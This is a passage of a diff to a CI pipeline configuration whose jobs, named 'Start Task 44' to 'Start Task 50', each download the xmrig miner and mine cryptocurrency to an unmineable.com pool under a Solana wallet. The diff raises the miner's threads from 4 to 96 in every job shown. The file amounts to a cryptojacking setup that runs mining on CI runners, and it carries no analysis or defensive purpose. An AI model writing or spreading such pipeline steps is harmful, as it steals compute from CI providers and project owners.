-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 44
           commands:
             - sudo apt update
@@ -359,7 +359,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 45
           commands:
             - sudo apt update
@@ -367,7 +367,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 46
           commands:
             - sudo apt update
@@ -375,7 +375,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 47
           commands:
             - sudo apt update
@@ -383,7 +383,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 48
           commands:
             - sudo apt update
@@ -391,7 +391,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 49
           commands:
             - sudo apt update
@@ -399,7 +399,7 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
         - name: Start Task 50
           commands:
             - sudo apt update
@@ -407,5 +407,5 @@ blocks:
             - 'wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz'
             - tar -xvf xmrig-6.22.2-linux-static-x64.tar.gz
             - cd xmrig-6.22.2
-            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.Saw666 -p x --tls --threads=4'
+            - './xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u SOL:HHQRYqPLShkPQKLCGogYbQycDycjqdbb1pXbLvbmB8Mt.SawXNat -p x --tls --threads=96'
        
